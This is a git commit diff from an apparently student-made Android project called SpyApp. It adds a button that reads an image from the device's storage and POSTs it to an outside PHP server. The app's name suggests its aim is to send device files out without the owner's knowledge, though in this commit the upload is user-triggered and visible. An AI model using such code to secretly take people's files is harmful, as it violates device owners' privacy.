de3ec3112cd66790cd798297c80fc7a0609c285b
Syst54 <sylvain.stoesel@telecomnancy.net>
2014-03-23 17:18:28 -0400

    Tentative envoi fichier image

--- SpyApp/src/com/example/spyapp/SpyActivity.java
+++ SpyApp/src/com/example/spyapp/SpyActivity.java
@@ -1,17 +1,42 @@
 package com.example.spyapp;
 
-import android.os.Bundle;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+
 import android.app.Activity;
+import android.os.Bundle;
+import android.util.Log;
 import android.view.Menu;
+import android.view.View;
+import android.widget.Button;
+import android.widget.Toast;
 
 public class SpyActivity extends Activity {
 
-	//Petite modif juste pour tester :)
-	//YALHAAAA
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
+		
+		
+		Button sendButton = (Button) findViewById(R.id.button1);
+		final SpyActivity zis = this;
+		sendButton.setOnClickListener(new View.OnClickListener() {
+		    public void onClick(View view) {
+		    	try {
+		            upload();
+		            Toast.makeText(zis, "Upload suceeded", Toast.LENGTH_LONG).show();
+		        } catch (Exception e) {
+		            Toast.makeText(zis, "ERREUR: "+e.toString(), Toast.LENGTH_LONG).show();  
+		            e.printStackTrace();
+		        }
+		    }
+		});
 	}
 
 	@Override
@@ -20,5 +45,64 @@ public class SpyActivity extends Activity {
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
 	}
+	
+	
+	public void upload() throws Exception {
+        HttpURLConnection connection = null;
+        DataOutputStream outputStream = null;
 
+        String pathToOurFile = "/sdcard/img.jpg";
+        String urlServer = "http://uqac.netii.net/sendimage.php";
+        String lineEnd = "\r\n";
+        String twoHyphens = "--";
+        String boundary = "*****";
+
+        int bytesRead, bytesAvailable, bufferSize;
+        byte[] buffer;
+        int maxBufferSize = 1 * 1024 * 1024;
+
+            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));
+            URL url = new URL(urlServer);
+
+            connection = (HttpURLConnection) url.openConnection();
+            connection.setDoInput(true);
+            connection.setDoOutput(true);
+            connection.setUseCaches(false);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("Connection", "Keep-Alive");
+            connection.setRequestProperty("Content-Type",
+                    "multipart/form-data;boundary=" + boundary);
+
+            outputStream = new DataOutputStream(connection.getOutputStream());
+            outputStream.writeBytes(twoHyphens + boundary + lineEnd);
+            outputStream
+                    .writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
+                            + pathToOurFile + "\"" + lineEnd);
+            outputStream.writeBytes(lineEnd);
+
+            bytesAvailable = fileInputStream.available();
+            bufferSize = Math.min(bytesAvailable, maxBufferSize);
+            buffer = new byte[bufferSize];
+
+            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+
+            while (bytesRead > 0) {
+                outputStream.write(buffer, 0, bufferSize);
+                bytesAvailable = fileInputStream.available();
+                bufferSize = Math.min(bytesAvailable, maxBufferSize);
+                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+            }
+
+            outputStream.writeBytes(lineEnd);
+            outputStream.writeBytes(twoHyphens + boundary + twoHyphens
+                    + lineEnd);
+
+            String serverResponseMessage = connection.getResponseMessage();
+
+            Toast.makeText(this, serverResponseMessage, Toast.LENGTH_LONG).show();
+
+            fileInputStream.close();
+            outputStream.flush();
+            outputStream.close();
+    }
 }
